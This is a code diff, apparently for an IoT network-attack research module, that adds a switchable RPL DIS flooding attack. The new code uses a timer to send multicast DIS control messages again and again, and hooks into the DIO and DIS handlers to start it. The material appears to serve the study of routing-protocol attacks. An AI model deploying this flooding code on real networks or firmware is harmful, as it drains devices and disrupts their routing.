@@ -64,6 +64,17 @@
  */
 
 /*
+ * DIS Flooding Attack - send multicast DIS periodically and after
+ * receiving DIO.
+ */
+bool network_attacks_rpl_dfa = false;
+
+/*
+ * DIS Flooding Attack minimum period in milliseconds.
+ */
+uint32_t network_attacks_rpl_dfa_period = 5000;
+
+/*
  * Drop any forwarded UDP packets. Application packets are sent using
  * UDP, routing control packets via ICMP6.
  */
@@ -98,6 +109,9 @@ uint16_t network_attacks_fake_id = 0;
 static uint16_t current_fake_id = 0;
 static linkaddr_t original_address;
 static struct ctimer periodic_timer;
+static struct ctimer dfa_timer;
+/*---------------------------------------------------------------------------*/
+static void schedule_dfa(void);
 /*---------------------------------------------------------------------------*/
 static void
 set_fake_id(uint16_t fake_id)
@@ -125,10 +139,31 @@ set_fake_id(uint16_t fake_id)
 }
 /*---------------------------------------------------------------------------*/
 static void
+dfa(void *ptr)
+{
+  if(network_attacks_rpl_dfa) {
+    schedule_dfa();
+    rpl_icmp6_dis_output(NULL);
+  }
+}
+/*---------------------------------------------------------------------------*/
+static void
+schedule_dfa(void)
+{
+  ctimer_set(&dfa_timer,
+	     (network_attacks_rpl_dfa_period * CLOCK_SECOND) / 1000,
+	     dfa, NULL);
+}
+/*---------------------------------------------------------------------------*/
+static void
 check_config(void *ptr)
 {
   if(current_fake_id != network_attacks_fake_id) {
     set_fake_id(network_attacks_fake_id);
+  }
+
+  if(network_attacks_rpl_dfa && ctimer_expired(&dfa_timer)) {
+    ctimer_set(&dfa_timer, CLOCK_SECOND / 2, dfa, NULL);
   }
 
   ctimer_restart(&periodic_timer);
@@ -217,6 +252,10 @@ process_dio_input(struct uip_icmp_hdr *hdr)
     }
   }
 
+  if(network_attacks_rpl_dfa && ctimer_expired(&dfa_timer)) {
+    schedule_dfa();
+  }
+
   return NETSTACK_IP_PROCESS;
 }
 /*---------------------------------------------------------------------------*/
@@ -296,6 +335,10 @@ process_dis_output(struct uip_icmp_hdr *hdr)
     /* Multicast */
   } else {
     /* Unicast */
+  }
+
+  if(network_attacks_rpl_dfa && ctimer_expired(&dfa_timer)) {
+    schedule_dfa();
   }
 }
 /*---------------------------------------------------------------------------*/
